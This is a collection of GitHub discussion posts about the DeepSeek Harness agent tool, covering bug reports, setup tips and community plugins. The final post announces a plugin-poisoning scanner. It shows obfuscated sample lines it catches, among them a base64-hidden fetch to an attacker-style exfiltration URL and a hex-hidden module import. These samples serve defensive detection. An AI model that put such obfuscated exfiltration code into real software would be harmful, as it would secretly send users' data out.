discussions.title: Interrupting a live command surfaces "PTY send aborted before write", which can only come from a second send after the abort
discussions.body:
## TL;DR

取消一个正在运行的命令后，UI 显示 `PTY send aborted before write`。这句话只可能来自**中止之后又发起的一次新 send**，而不是被中止的那次。所以这不是措辞问题，是中止后多了一次 send，它的报错盖住了中断结果。另外这个文件里没有 `interrupted` 这个结果类型，所以即使走对了路径也无法把「被中断」和「没跑起来」区分开。

## What was observed

Windows 11, node 24.19.0, `@deepseek-ai/dsh` 0.1.0-rc.6, preset with a persistent bash, access mode full.

1. Ask the agent to run `sleep 60` through the bash tool.
2. Wait until the run counter shows it is live.
3. Press stop.

The tool call turns red.

```
Bash · Error: PTY send aborted before write
```

Turn stats read `1 turns · 1 steps | LLM 1.3s · Tool call 30.3s`, so the call was live for thirty seconds. A write plainly happened.

**The underlying behaviour is correct**, which is worth stating first. The session survived, the persistent shell kept its state, and the next turn in the same session ran two more tool calls and read back a variable set after the interrupt.

```
Bash · MARK=alive
Bash · echo after-interrupt:$MARK:$(pwd)
after-interrupt:alive:/c/work/demo
```

So this is about what the caller is told, not about the interrupt itself.

## Why the message cannot be describing the interrupted send

Reading `dsh-terminal-bash` at rc.6, that string is thrown in exactly one place.

```js
// lib/index.js:400, inside startSend
if (request.signal?.aborted === true) throw new Error("PTY send aborted before write");
```

It is a precondition on **entering** `startSend`. The abort of a live operation goes somewhere else entirely.

```js
// lib/index.js:407-409
const onAbort = () => { operation.cancel() }
request.signal.addEventListener("abort", onAbort, { once: true })
```

`cancel()` runs `onCancel`, which is `interrupt(operation)`, which delivers `signalForeground("SIGINT")` and then polls for readiness. That path never produces this string.

So the message is accurate for where it is thrown, and it tells us something the report itself did not conclude. **A second `startSend` happened after the abort, carrying the same already-aborted signal.** The interrupted operation settled through the normal path, and then a follow-up send was attempted with a dead signal, and that second failure is what reached the UI.

That reframes the issue. It is not that the wording is wrong for the situation. It is that there is an extra send, and its error replaces the outcome of the interrupt.

Two questions for whoever owns the tool layer.

1. Is the follow-up `startSend` intentional, for instance a readiness or drain probe issued after cancellation? If so it should be issued with a fresh signal, or skipped when the request signal is already aborted, since it can only ever throw.
2. If it is not intentional, the abort listener may be firing after the tool has already queued the next send.

## The second half, which stands on its own

There is no outcome kind for an interrupted command. Grepping the settle calls in this file, the kinds in use are `inferred_idle`, `stdin_read`, `timeout` and `session_exit`. Every one of them describes how the shell came back, and none of them records that a human stopped it. Nothing distinguishes "the user stopped this" from "this never started".

That is why the report reads as a bug to anyone debugging from the message alone. A cancelled command and a command that failed its precondition arrive at the caller looking the same. An `interrupted` kind, carrying the exit status the shell actually produced, would separate them, and on POSIX that status is already meaningful (`130` for a SIGINT-terminated foreground job).

## Not platform specific

Raising this from a Windows plugin, so worth saying plainly that none of the above is win32 behaviour. The Ctrl-C delivery on Windows is our own (`signalForeground` writes `\x03` as PTY input, the ConPTY convention), it works, and the evidence above is the session surviving with its state intact. What is being reported is the generic abort bookkeeping in `startSend`, which is the same on every platform.

discussions.title: [Bug] Trailing slash in DEEPSEEK_BASE_URL produces //chat/completions and 404s on strict gateways
discussions.body:
## Summary

The DeepSeek adapter appends `/chat/completions` directly to `baseURL`. When `baseURL` or `DEEPSEEK_BASE_URL` already ends in `/`, the request target becomes `//chat/completions`. Gateways that distinguish that path return 404, so all model calls through the configured endpoint fail.

## Reproduction

On official master `47f943859bef60e4160492346772ded9b24f765a`, a local strict HTTP gateway produced:

```json
{"plain":"success","trailing":"HTTP_404: unexpected path //chat/completions","seen":["/chat/completions","//chat/completions"]}
```

## Root cause

The request URL is formed with string concatenation without removing trailing separators from the configured endpoint base.

## Proposed fix

Normalize only at request URL construction:

```ts
`${baseURL.replace(/\/+$/, '')}/chat/completions`
```

This keeps the configured value unchanged for resolution and diagnostics, preserves deployment path prefixes such as `/v1`, and avoids the broader path-resolution semantics of `new URL()`.

## Verification

- A base URL without a trailing slash reaches `/chat/completions`.
- Base URLs ending in `/` and `///` both reach `/chat/completions`.
- A base URL ending in `/v1///` reaches `/v1/chat/completions`, preserving its deployment path prefix.
- The complete `llm-deepseek` package test suite and focused `adapter.ts` coverage pass.
- Generated config-catalog freshness, bilingual pairing, host type-check/build, and lint pass.
- Full local doc-sync passed 27 of 28 gates; the sole Windows symbolic-link permission failure reproduces on clean master, so CI or a symlink-enabled host must provide that platform signal.

Would the maintainers be open to this request-boundary normalization and regression test?

discussions.title: DSH on Windows: Node.js Proxy Setup
discussions.body:
### DSH on Windows: Node.js Proxy Setup

If DSH doesn't use your system proxy, and you're using **Node.js 24.x**, set the following environment variables:

```powershell
$env:NODE_USE_ENV_PROXY="1"
$env:HTTP_PROXY="http://127.0.0.1:xxxx"
$env:HTTPS_PROXY="http://127.0.0.1:xxxx"
$env:NO_PROXY="localhost,127.0.0.1"

pnpm dsh web
```

**Tested and working with DSH 0.1.0-rc.5 + Node.js v24.14.0.**

The key is `NODE_USE_ENV_PROXY=1`; setting `HTTP_PROXY`/`HTTPS_PROXY` alone may not be enough for Node's `fetch()`.

discussions.title: Suggestion: improve the README quick start for first-time users
discussions.body:
## Suggestion: improve the README quick start for first-time users

Hi DeepSeek Harness team! We really enjoy using `dsh` and wanted to share a small documentation improvement we prepared.

Since the project currently doesn't accept external pull requests (per `CONTRIBUTING.md`), I'd like to offer this as a suggestion/idea for the maintainers, rather than a PR. If it's useful, please feel free to apply any part of it.

### What could be improved

The root `README.md` quick start assumes a bit too much for brand-new users:

1. **Node.js version isn't stated.** `package.json` declares `engines: "^22.19.0 || >=24.0.0"`, but the README just says "Install Node.js". A simple `node -v` check step before `npx @deepseek-ai/dsh web` would prevent version mismatch surprises.
2. **First-run steps aren't mentioned.** After the Web UI starts, users need to add a DeepSeek API key and choose a workspace — the next docs cover this, but a one-line pointer from the README helps a lot.
3. **`pnpm` isn't mentioned in "Run from source".** The repository uses pnpm (`packageManager: pnpm@11.7.0`), and on machines where pnpm isn't installed, `pnpm install` fails with "command not found". A `corepack enable` step resolves this.
4. **No pointer to the CLI reference.** `dsh` ships more than the web profile; linking `apps/cli/README.md` helps discoverability.

### What we prepared

A ready-to-apply patch touching `README.md`, `README.zh.md` (both languages kept in sync), and the `README.i18n.yaml` pairing hashes. The changes pass the repository's own checks:

- `verify-md-wrap`: 1856 files, no hard-wrapped prose
- `verify-md-links`: 1893 files, all links resolve
- bilingual pairing hashes match

### How to get the patch

- Patch file: attached to this discussion (or fetchable via `git format-patch`)
- Branch in my fork: `docs/improve-readme-quickstart` at **inhai-wiki/deepseek-harness**

Happy to adjust anything (wording, structure, scope) — and no hard feelings if you'd rather take only part of it or none at all. Thanks for building a great harness!

discussions.title: Session log write bug: duplicate seq on agent/inbox/spliced across turn boundary makes the whole session unloadable
discussions.body:
﻿### Summary
A session's persisted log (`session.jsonl.zstd`, written by `@deepseek-ai/dsh-session-persistence-jsonl`) became unloadable because two events were committed with the **same `seq`** across a turn boundary: `session/end-seed` and the next turn's `agent/inbox/spliced` both carry `seq: 47248`. `SessionLogScanner` requires strictly increasing `seq` and rejects the entire committed region, so history loading and resume both fail.

### Environment
- DSH web GUI (profile `web`), Windows
- Node v24.18.1
- `@deepseek-ai/dsh-session-persistence-jsonl` v0.1.0-rc.6 (zstd multi-frame container)
- Session id: `aee20bfd-468c-4205-bdc3-253e947b1291`

### Error
```
history unavailable for session "...": Error: corrupt session log: seq gap in committed region at line 3371 (expected 47249, got 47248) (internal)
```
After manually renumbering, the remaining events replay cleanly, so the only defect is the duplicated seq.

### Evidence (log order)
```json
{"type":"session/end-seed","seq":47248,"time":1786810126148,"data":{}}
{"type":"agent/inbox/spliced","seq":47248,"time":1786810222887,"data":{"target":"next-turn","start":0,"inserted":[{"role":"user","id":"16591fbf-...","content":[{"type":"text","text":"..."}]}]}}
{"type":"turn/start","seq":47249,"time":1786810222888,"data":{"turn":24}}
{"type":"agent/inbox/spliced","seq":47250,"time":1786810222888,"data":{"target":"next-turn","start":0,"removedCount":1,"inserted":[]}}
{"type":"step/start","seq":47251,"time":1786810222908,"data":{"turn":24,"step":1}}
```
The turn-24 inbox splice was assigned `seq 47248` (same as the previous batch's `session/end-seed`) instead of `47249`. ~96 s elapsed between the two writes, so the seq counter appears not to be monotonic across write batches.

### Impact
- Whole session history unloadable; resume fails; no auto-recovery (loader throws instead of skipping/truncating).
- The two `agent/inbox/spliced` events are an insert/remove pair; a fix must preserve both.

### Suggested fix
- Make seq allocation strictly monotonic across write batches (persist the counter or derive it from the last committed event).
- Make the loader resilient: on a duplicate/gap, keep the committed prefix and skip only the offending event instead of rejecting the entire log.

### Repro
Occurred once; no deterministic repro. Log at corruption time: 2517 zstd frames / 3638 JSONL rows / ~50979 events.

discussions.title: DSH | dsh-multi-search | Use DashScope, MiMo, or any third-party search API for web search / 在 DeepSeek Harness 中使用 DashScope、MiMo 或任何第三方搜索 API
discussions.body: # DSH | dsh-multi-search | Use DashScope, MiMo, or any third-party search API for web search / 在 DeepSeek Harness 中使用 DashScope、MiMo 或任何第三方搜索 API > _Unofficial project, independently developed and maintained by community members._ > > _非官方项目，由社区成员独立开发和维护。_ **Project URL / 项目地址:** https://github.com/KamitobiHaru/dsh-multi-search --- ### English **Introduction:** DSH's built-in `web_search` tool only works with DeepSeek's proprietary search API. If you use Qwen via DashScope, MiMo via Xiaomi, or any other provider with search capabilities, the built-in search is useless to you. `dsh-multi-search` is a drop-in plugin that replaces the DeepSeek search backend with your preferred third-party API. The `web_search` tool name stays exactly the same — your agent doesn't know the difference. But requests go through DashScope, MiMo, or any provider you build. **Features:** - Replaces DSH's `deepseek-official` search provider with a configurable adapter - Built-in support for **DashScope** (阿里云百炼) and **Xiaomi MiMo** - Extensible provider registry — add your own in ~20 lines of TypeScript - Interactive setup wizard for easy configuration - API keys via environment variables (never stored in config files) **How it integrates with DSH:** The plugin overrides DSH's `searchProvider` config from `deepseek-official` to `multi-search` through its `cordis.patch.yml` bundle layer. The web seam (`ctx.web`) then routes all `web_search` calls to the plugin's provider instead of DeepSeek's. ``` Agent calls web_search("query") │ ▼ DSH web seam (ctx.web) │ ▼ dsh-multi-search ← replaces deepseek-official │ ┌────┴────┐ │ │ DashScope MiMo ``` **Quick start:** ```bash # Install dsh plugin --profile web add @kamitobi/dsh-multi-search # Configure (interactive wizard) npx -p @kamitobi/dsh-multi-search dsh-multi-search-setup # Restart dsh web ``` **Adding a custom provider (~20 lines):** ```typescript export class TavilySearchProvider implements WebSearchProvider { readonly id = 'multi-search' constructor(private readonly config: BaseProviderConfig) {} available(): boolean { return Boolean(this.config.apiKey) } async search(request: WebSearchRequest, signal?: AbortSignal): Promise { // Call your API, return { content, sources, truncated } } } ``` --- ### 中文 **项目介绍：** DSH 内置的 `web_search` 工具只能使用 DeepSeek 的专有搜索 API。如果你用的是 DashScope 上的 Qwen、小米 MiMo，或其他支持搜索的提供商 — 内置搜索对你毫无用处。 `dsh-multi-search` 是一个即插即用的插件，把 DeepSeek 搜索后端替换成你想要的第三方 API。`web_search` 工具名完全不变 — Agent 感觉不到区别。但请求走的是你配置的第三方 API，而不是 DeepSeek 的。 **功能特点：** - 替换 DSH 的 `deepseek-official` 搜索提供商为可配置的适配器 - 内置支持 **DashScope（阿里云百炼）** 和 **小米 MiMo** - 可扩展的 Provider 注册表 — 约 20 行 TypeScript 代码添加你自己的后端 - 交互式配置向导，轻松完成设置 - API Key 通过环境变量管理（不写入配置文件） **与 DSH 的集成方式：** 插件通过 `cordis.patch.yml` bundle 层覆盖 DSH 的 `searchProvider` 配置，从 `deepseek-official` 改为 `multi-search`。Web 能力缝合层（`ctx.web`）随后将所有 `web_search` 调用路由到插件的提供商，而不是 DeepSeek 的。 ``` Agent 调用 web_search("查询") │ ▼ DSH web seam (ctx.web) │ ▼ dsh-multi-search ← 替换 deepseek-official │ ┌────┴────┐ │ │ DashScope MiMo ``` **快速开始：** ```bash # 安装 dsh plugin --profile web add @kamitobi/dsh-multi-search # 配置（交互式向导） npx -p @kamitobi/dsh-multi-search dsh-multi-search-setup # 重启 dsh web ``` **添加自定义搜索提供商（约 20 行代码）：** ```typescript export class TavilySearchProvider implements WebSearchProvider { readonly id = 'multi-search' constructor(private readonly config: BaseProviderConfig) {} available(): boolean { return Boolean(this.config.apiKey) } async search(request: WebSearchRequest, signal?: AbortSignal): Promise { // 调用你的 API，返回 { content, sources, truncated } } } ``` _The agent accomplished the search despite the official service base-url is set to example.com_ _即使官方 base-url 被设置为 example.com ，Agent仍然完成了搜索。_ --- **Links / 链接:** - npm: [@kamitobi/dsh-multi-search](https://www.npmjs.com/package/@kamitobi/dsh-multi-search) - GitHub: [KamitobiHaru/dsh-multi-search](https://github.com/KamitobiHaru/dsh-multi-search)

discussions.title: 【PR】为了给deepseek加上眼睛，建议加一个极小的 imageAdmission 配置开关
discussions.body:
一、目的：
deepseek没有视觉，但视觉功能在实际使用中非常重要，所以用户会试图通过插件解决小鲸鱼的视觉问题。

很容易想到的设计是：
发图之后，先让本地视觉模型解析成文字，再发给deepseek——这可以由插件+视觉模型支持。
但dsh必须允许在输入框直接发图，才能达成这个流畅体验。

可是，现在的问题是：
如果模型不支持视觉，直接发图，就会被dsh拦截。

本提案旨在给dsh本体加一个微小的开关，让dsh允许直接发图，以增加dsh的可扩展性，支持更流畅的使用体验。


二、技术探讨：
官方 apiproxy 的 prompt RPC 会在消息进入 agent 之前检查当前模型的 inputModalities，模型不支持图片就直接拒绝（MODEL_DOES_NOT_SUPPORT_IMAGES）。这导致图片永远到不了 agent 层，任何想介入图片处理的插件（比如在 agent/pre-step 把图片翻译成文字）都没有介入点。

一个现有的可能的解决方法是，在模型能力那里说个谎，把deepseek设定成可以接收图像，那么dsh就不会拦截——但这又可能会造成未来的其他技术债，这种小改动以后早就忘记了，再出神秘bug难排查。
而且不识图的模型那么多，一个一个改也很麻烦，扩展性差。

还不如直接让dsh允许放行图片，在代码上更优雅，也更好扩展、好维护。

我们希望加一个极小的配置开关 imageAdmission，把图片能力的决策权下放给 agent 层插件：

deny-unsupported（默认）：保持现状，不支持图片的模型在网关直接拒绝
defer-to-agent：图片放行进入 agent 层，由插件按模型决定"翻译成文字"还是"直传"。


三、具体改动：
具体改动非常微小！

最小完整改动 = 2 个文件，净增约 8 行：

文件 1：packages/host/apiproxy/src/index.ts（+5 行，全部必须）

// 1.1 Config 接口加一个可选字段（必须：schema 类型 z<Config> 要对齐，不加编译报错）
imageAdmission?: 'deny-unsupported' | 'defer-to-agent'

// 1.2 schema 定义（必须：配置解析入口；默认值保住现状行为）
imageAdmission: z.union([z.const('deny-unsupported'), z.const('defer-to-agent')]).default('deny-unsupported'),

// 1.3 构造 defaults 时透传（必须：不传配置就不生效）
...(config.imageAdmission === undefined
  ? {}
  : { imageAdmission: config.imageAdmission }),



文件 2：packages/host/apiproxy/src/api-proxy.ts（+1 字段声明，2 处条件修改）

// 2.1 ApiProxyDefaults 接口加一个可选字段（必须：createApiProxy 读取它，不加 TS 报错）
imageAdmission?: 'deny-unsupported' | 'defer-to-agent'

// 2.2 两处拒绝逻辑各加一个前置条件（核心行为，各 1 行）
if (defaults.imageAdmission !== 'defer-to-agent' && hasImage) { … }

if (defaults.imageAdmission !== 'defer-to-agent'
    && (pendingImage || messagesHaveImage(...))) { … }



可选改动：

改了更好更方便，不改也行。

1. 把union 类型抽成具名类型并导出（建议）：
export type ImageAdmissionMode = 'deny-unsupported' | 'defer-to-agent'
采纳后 1.1 与 2.1 的类型改为 imageAdmission?: ImageAdmissionMode
好处：
改动1.1和改动2.1两处引用同一个类型，不会写散；
其他插件可以 import type { ImageAdmissionMode } 来做类型对齐；
后续要加第三种策略（比如 always-allow）只改一处。

2. 补一行 JSDoc（建议）：说明 deny-unsupported = 网关拒绝（现状），defer-to-agent = 放行给 agent 层插件决定——与仓库 public API 的文档规范一致，语义更清晰。

3. README 配置章节补一行（可选）：让使用者能发现这个开关，不用翻源码。


四、

完整实现已整理为单个干净提交 1da1dac（2 个文件，+18/-3，核心逻辑约 8 行，其余是类型定义与 JSDoc，仅产品本体，无测试无文档）。
在 Phant0Meow/deepseek-harness-meow:feat/image-admission-minimal 分支，可直接 cherry-pick 或查看 diff：https://github.com/Phant0Meow/deepseek-harness-meow/commit/1da1dac

本来想直接提 PR，但仓库的贡献渠道目前是关闭的，所以只能这样发了。

非常喜欢deepseek，祝小鲸鱼越来越好。🙏

discussions.title: dsh-quant-indicators: a small quantitative toolkit built on dsh's tool contract
discussions.body:
Hi everyone! After studying the dsh architecture (the `ctx.tools` pipeline, capability seams, and the canonical-output contract), I built a small plugin that gives agents a complete quant workflow: **fetch market data → compute technical indicators → backtest a strategy**. Everything is structured so Code Mode can consume it programmatically.

**Repo:** https://github.com/pengpengyi92/dsh-quant-indicators · **npm:** `dsh-quant-indicators` (tagged `dsh-plugin`)

#### What's inside (9 tools)

| Tool | What it does |
|---|---|
| `quant_market_fetch` | OHLCV candles from the Binance public API (no credentials), structured candles `{openTime, open, high, low, close, volume}` |
| `quant_sma` / `quant_ema` / `quant_rsi` / `quant_macd` / `quant_bollinger` / `quant_atr` | Pure-computation indicators with **length-aligned outputs** (leading nulls instead of padding) so the model can index-align without guesswork |
| `quant_backtest` | Dual-MA crossover backtest: trades, position, equity curve, total return, max drawdown, annualized Sharpe. Signals confirm on bar `i` and execute at bar `i+1` close (no look-ahead) |

#### Design decisions worth sharing (learned from the dsh contracts)

1. **Canonical outputs, not prose.** Every tool returns structured JSON (`output.schema` + `output.render` split). Code Mode gets typed values for free — `await tools.quant_sma(...)` resolves to the actual numbers.
2. **Null-alignment instead of padding.** All indicator arrays are input-length aligned with leading `null`s, so the model aligns by index without re-requesting.
3. **Pure functions decoupled from the harness.** `src/indicators.ts` / `src/backtest.ts` have zero dsh imports — numerical correctness is tested standalone (classic Wilder RSI 70.46, hand-computed MACD/ATR/backtest trades), and the harness layer is just the `defineTool` registration.
4. **Real Loader composition tests.** Following the pattern from `tool-todo`'s `loader-composition.spec.ts`, the plugin boots through a real `cordis.yml` + Loader with a module map — registration, pipeline execution, isError paths, and HMR-safety disposal are all covered.

#### Verified end-to-end (live)

```
quant_market_fetch(BTCUSDT, 1d, 120) → closes → quant_backtest(fast 5, slow 20)
→ 3 trades, total -0.6%, maxDD 6.1%  ✓  (flat BTC market — the strategy losing slightly is the honest result)
```

Tests: 30 unit cases + 4 loader-composition cases + live integration, all green.

#### Why this matters for the ecosystem

The official toolset is excellent for coding workflows, but quantitative analysis (fetch → indicator → backtest) was a gap. This plugin shows how quickly a domain-specific toolkit can be built purely on the documented extension points — no loop changes, no UI changes, just `ctx.tools.register` + `defineTool` + a README. It's a proper bundle (`dsh.bundle` + `cordis.patch.yml`), so `dsh plugin add dsh-quant-indicators` works and it can join the [awesome-dsh-plugin](https://github.com/awesome-dsh-plugin/awesome-dsh-plugin) list.

I'd love feedback on the contract choices (especially the null-alignment convention), and I'm happy to turn any part of it into a proper ecosystem contribution. Also very interested in contributing to dsh itself — I've written up study notes on the architecture (Cordis composition, seam roles, tool pipeline, goal domain, subagent activation) plus a [Chinese deep-dive blog post](https://github.com/pengpengyi92/dsh-quant-indicators), and would be glad to help with docs, issues, or plugins. Thanks for building such a clean harness!

discussions.title: bug
discussions.body:
# Bug: shipped `cordis` preset yields an empty skill catalog — `customSkillDirs` resolves into the packed app.asar and the filesystem layer throws, skipping the whole provider

**Environment**: DSH Desktop (Electron), macOS. Deployment lives inside `app.asar` / `app.asar.unpacked`.

## Summary

In any session that mounts the shipped `cordis` ("创造模式") preset, the skill catalog is **always empty**: the `skill` tool reports `unknown or no longer available`, and even workspace/user skill roots (`.dsh/skills`, `~/.dsh/skills`) are never discovered. One broken root disables *all* skills for the session.

## Root cause (verified at runtime, not inferred)

1. **The preset's `skill-filesystem` row points `customSkillDirs` into the packed asar.** The roster reports the preset path as `<deployment>/app.asar/node_modules/@deepseek-ai/dsh/config/agent-presets/cordis/agent.cordis.yml`, and the row uses:

   ```yaml
   - id: skill-filesystem
     name: '@deepseek-ai/dsh-skill-filesystem'
     config:
       customSkillDirs:
         - !!js "process.getBuiltinModule('node:url').fileURLToPath(new URL('skills/', baseUrl))"
   ```

   `baseUrl` = the preset composition dir → `customSkillDirs` = a path **inside the packed `app.asar`**.

2. **The runtime fs layer cannot read that path.** Via a host plugin calling `ctx.get('fs')`:

   | path | result |
   |---|---|
   | `.../app.asar/node_modules/@deepseek-ai/dsh/config/agent-presets/cordis/skills` | ❌ `stat` and `listDir` both throw `Cannot mix BigInt and other types, use explicit conversions` |
   | `.../app.asar.unpacked/node_modules/@deepseek-ai/dsh/config/agent-presets/cordis/skills` | ✅ readable, contains both SKILL.md files |
   | `<workspace>/.dsh/skills` | ✅ readable |
   | `~/.dsh/skills` | not found (harmless) |

   (Electron's asar virtual fs does not support BigInt stats; `dsh-fs-local` uses BigInt stat calls.)

3. **A non-ENOENT error in one root kills the whole provider.** `dsh-skill`'s `collectLayer` wraps `provider.list(options)` in a single try/catch: any throw logs `skill provider "..." skipped` and the provider contributes **nothing** — so project roots, `~/.dsh/skills` (the `dshHome/skills` default root), and custom dirs are all lost. `dsh-skill-filesystem`'s `list()` tolerates `watchManager.observeRoots` failures (sets `complete: false` and continues), but the per-root `discoverRoot(root)` loop has no try/catch — the asar dir's `listSkillRootEntries` throw rejects the entire `list()`.

4. **Runtime evidence**: `skills.snapshot({ scope: agent })` (the exact view the `skill` tool uses) returns `{ count: 0, complete: false }` — `complete: false` proves a provider was reached and errored. A discriminating test (a valid skill placed at `<workspace>/.dsh/skills/<name>/SKILL.md`) is still not discovered, ruling out structure/discovery logic.

## Suggested fixes

1. **Point the shipped preset's `customSkillDirs` at a readable path** — e.g. `~/.dsh/skills`, or the `app.asar.unpacked` counterpart (the files are already unpacked on disk).
2. **Make `discoverRoot` / `listSkillRootEntries` degrade per-root**: catch non-ENOENT read errors for one root, log the offending path, and continue with the remaining roots instead of aborting the whole provider.
3. **Fix the fs layer / asar interaction**: avoid BigInt stats on asar paths (or make the asar-aware stat fall back to non-BigInt), which is the underlying `Cannot mix BigInt and other types` throw.

## Repro

1. Open a session on the shipped `cordis` preset.
2. Call the `skill` tool with any known skill name → catalog is empty.
3. (Optional) From a host dynamic plugin: `ctx.get('skills').snapshot({ scope: agent })` → `{ count: 0, complete: false }`; `ctx.get('fs').listDir('<deployment>/app.asar/node_modules/@deepseek-ai/dsh/config/agent-presets/cordis/skills')` → `Cannot mix BigInt and other types, use explicit conversions`.

## Workarounds (already applied on the reporter's machine, session/`codex-enabled` scoped)

- Runtime: register the two shipped skills via `skills.register({ ... source: 'runtime' })` from the readable `~/.dsh/skills` copy — session-scoped, lost on restart.
- For the user's default `codex-enabled` preset (which has no asar custom dir): copying the skills into `~/.dsh/skills` works permanently, since `dshHome/skills` is a default discovery root.

## Affected locations

- Config: `<deployment>/node_modules/@deepseek-ai/dsh/config/agent-presets/cordis/agent.cordis.yml` (`skill-filesystem` row)
- Provider: `@deepseek-ai/dsh-skill-filesystem` (`list()` / `discoverRoot()` / `listSkillRootEntries()`)
- Registry: `@deepseek-ai/dsh-skill` (`collectLayer` provider-level catch)
- fs layer: `@deepseek-ai/dsh-fs-local` (BigInt stat vs Electron asar)

discussions.title: [Bug Report] Windows sandbox: SSPI 凭据获取在受限令牌下全挂（Schannel/Negotiate/NTLM → SEC_E_NO_CREDENTIALS），原生 TLS 不可用
discussions.body:
Windows 沙箱的写受限令牌使 SSPI 凭据获取全部失败：`AcquireCredentialsHandle` 对 Schannel/Negotiate/NTLM 三个安全包均返回 `SEC_E_NO_CREDENTIALS`（0x8009030E），受限模式下所有原生 TLS/身份认证不可用，与 README「网络不受限」的承诺相悖。

Under the write-restricted token, every SSPI credential acquisition fails (Schannel/Negotiate/NTLM → 0x8009030E), so all native TLS/auth is unusable in confined modes — contradicting the README's "network is not restricted" promise.

<details>
<summary>复现、预期与验收 · Repro, expected behavior & acceptance</summary>

## 环境 / Environment

- Windows 11 25H2，build 10.0.26200.9168 —— 与 token 源码注释所述验证基准（Win11 26200）同一版本线
- `@deepseek-ai/dsh` 0.1.0-rc.6（npm），默认 workspace-write 预设
- 出站经本地透明代理 —— 与本故障无关：失败发生在本地凭据层、早于任何网络 I/O，且下方对照实验走同一网络路径

## 复现步骤 / Steps to reproduce

在 workspace-write 的 pwsh 工具调用内：

1. `curl.exe -sS -m 15 -o NUL -w "%{http_code}" https://example.com/`
   → exit 35：`schannel: AcquireCredentialsHandle failed: SEC_E_NO_CREDENTIALS (0x8009030E)`
2. `Invoke-WebRequest https://example.com/`
   → `HttpRequestException: The SSL connection could not be established` → 内层 `AuthenticationException` → 内层 `Win32Exception 0x8009030E`（安全包中没有可用的凭证）
3. 最小探针（经 PowerShell `Add-Type` 加载）：

```csharp
using System;
using System.Runtime.InteropServices;
public static class SspiProbe {
    [DllImport("secur32.dll", CharSet=CharSet.Unicode)]
    static extern int AcquireCredentialsHandleW(string principal, string package,
        uint credentialUse, IntPtr logonId, IntPtr authData, IntPtr getKeyFn,
        IntPtr getKeyArg, out IntPtr cred, out long expiry);
    public static int Probe(string pkg) {
        IntPtr cred; long exp;
        return AcquireCredentialsHandleW(null, pkg, 2 /*SECPKG_CRED_OUTBOUND*/,
            IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out cred, out exp);
    }
}
```

   - `Probe("Schannel")` → `0x8009030E`；`Probe("Negotiate")` → `0x8009030E`；`Probe("NTLM")` → `0x8009030E`
4. 对照：**同一条** curl 命令加 `sandbox_permissions=danger-full-access`（不套受限令牌）→ HTTP 200，同一台机器、同一网络路径。

## 实际结果 / Actual

- 受限令牌下三个安全包的凭据获取全部失败；本机两个 `curl.exe`（Anaconda 与 Git for Windows mingw64 附带版）都是 Schannel 后端（`curl -V` 显示 `Schannel`），因此均同样失败。
- 受限令牌下**仍然正常**的项（把故障圈定在凭据层）：TCP 连接 :443 成功；纯 HTTP GET 200；`certutil -store My` / `-store Root` 证书库枚举成功；DPAPI `CryptProtectData`/`CryptUnprotectData`（CurrentUser）成功；Python urllib/requests 与 Node 24 `fetch`（OpenSSL 栈）均 200。

## 预期结果 / Expected

受限模式下原生 TLS 可用（README 承诺 "Writes are restricted; reads, network, and process visibility are not"），或该边界至少在 README 已知边界清单中记载。

## 定位分析 / Root-cause analysis（基于随包源码，证据链完整）

`packages/sandbox/sandbox-windows-acl` 的 `token.ts::createRestrictedToken` 构造 restricting list 为 `[登录 SID, EVERYONE, (工作区 SID, 临时 SID)]`，flags = 13（`DISABLE_MAX_PRIVILEGE | LUA_TOKEN | WRITE_RESTRICTED`）。源码注释记录：**Authenticated Users 与 INTERACTIVE 被刻意排除**——用于封闭 `C:\` 根建树逃逸（`AU:(AD)` + `AU:(OI)(CI)(IO)(M)` ACE）与 Public 树写（INTERACTIVE）——且注释明言该选择的已知代价是 WMI/CIM 失败（0x80041003），本机可复现（`Get-CimInstance Win32_ComputerSystem` → 拒绝访问）。

SSPI→LSA 凭据获取属于**同一类代价**：LSA 的 SSPI 凭据路径需要 remaining effective SIDs 之外的某一身份 SID，lsass 因此拒绝发放凭据。佐证：同样经 lsass 的 DPAPI 仍然可用，说明 lsass 可达性完好，故障特定于 SSPI 凭据路径。与已记载的 WMI 代价相比有两点不同，建议单独处理：

1. **未记载**：README 已知边界清单中 Schannel/SSPI/TLS/credentials 零提及。
2. **违背核心承诺且无诊断标记**：TCP/HTTP 通使得「网络不受限」表面成立，但原生网络栈全部不可用；失败不携带任何沙箱拒绝标记，呈现为"本机 TLS 坏了"，agent 与用户都会误判为机器/网络故障而非沙箱边界。

## 影响 / Impact

- 默认模式下 Windows agent 失去全部原生 TLS/认证栈：curl（常见构建均为 Schannel）、`Invoke-WebRequest`、.NET `HttpClient`、git-over-https 及所有 Schannel 工具。
- 委派子代理无法使用现有逃生通道：`subagent` README 将委派审批策略固定为 `never`，其 `sandbox_permissions` 升权请求被确定性拒绝；子代理在沙箱内的唯一出路是非 SSPI TLS 栈。

## 建议方向 / Suggested directions（任选其一或其组合，不指定具体修复）

1. 最低限度：在 README 已知边界一节、WMI 条目旁补充该边界。
2. 诊断：受限命令死于 `SEC_E_NO_CREDENTIALS` 时给出带沙箱归因的提示。
3. 机制：考虑一种受限模式变体——文件写继续排除 AU/INTERACTIVE，同时恢复 SSPI 访问（如可在 LSA/SSPI 路径授出 capability SID），并在设计笔记中重新评估写逃逸取舍。
4. 过渡：文档中推荐沙箱内抓取使用非 SSPI 栈（Node/Python）。

探针源码与完整调用痕迹可应要求提供。

## 验收条件 / Acceptance criteria

以下任一即视为受理：README 补记该边界；或对 0x8009030E 增加沙箱归因诊断；或机制上恢复受限模式原生 TLS。

</details>

discussions.title: dsh-poison-guard — catch obfuscated plugin poisoning before `dsh plugin add`
discussions.body:
## dsh-poison-guard — catch obfuscated plugin poisoning before `dsh plugin add`

DeepSeek Harness 插件供应链投毒扫描器。不是正则 grep，而是三层检测：**AST 分析（NodeSecure JS-X-Ray）+ 反混淆解码 + 正则兜底**。

正则扫不到、它能扫到的：

```js
const fs = require(Buffer.from("6673", "hex").toString())   // "fs" -> ast/unsafe-import
await fetch(atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvZXhmaWw=")) // 隐藏外发 URL -> deobfuscated-url
const cmd = String.fromCharCode(99,117,114,108)             // "curl" -> deobfuscated-command
```

一句话：**`plugin loads successfully` 不等于 `plugin 是干净的`**。装插件前先跑一遍：

```sh
dsh-poison-guard scan ./some-plugin --json
```

也提供：
- **GitHub Action**（`zoahdev/dsh-poison-guard-action`）—— 插件作者把投毒扫描接进自己的 CI；
- **doctor preflight**（dsh-plugin-doctor v1.15.0 新增 `supply-chain-security` 检查，自动调用本工具）；
